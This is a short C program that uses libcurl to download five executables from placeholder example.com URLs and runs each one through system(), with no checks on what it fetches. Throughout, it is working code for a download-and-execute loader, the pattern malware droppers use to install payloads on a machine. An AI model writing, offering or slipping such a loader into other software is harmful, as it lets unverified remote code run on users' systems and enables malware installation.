#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

void downloadAndExecute(const char *url) {
    CURL *curl;
    FILE *fp;
    CURLcode res;
    const char *filename = "downloaded.exe";

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        fp = fopen(filename, "wb");
        if(fp == NULL) {
            fprintf(stderr, "Could not open file for writing.\n");
            return;
        }
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "cURL error: %s\n", curl_easy_strerror(res));
        }
        curl_easy_cleanup(curl);
        fclose(fp);

        // Execute the downloaded file
        char command[1024];
        sprintf(command, "%s", filename);
        system(command);
    }
    curl_global_cleanup();
}

int main() {
    const char *urls[] = {
        "http://example.com/path/to/your/exe.exe",
        "http://example.com/path/to/your/exe2.exe",
        "http://example.com/path/to/your/exe3.exe",
        "http://example.com/path/to/your/exe4.exe",
        "http://example.com/path/to/your/exe5.exe"
    };

    for (int i = 0; i < 5; ++i) {
        downloadAndExecute(urls[i]);
    }

    return 0;
}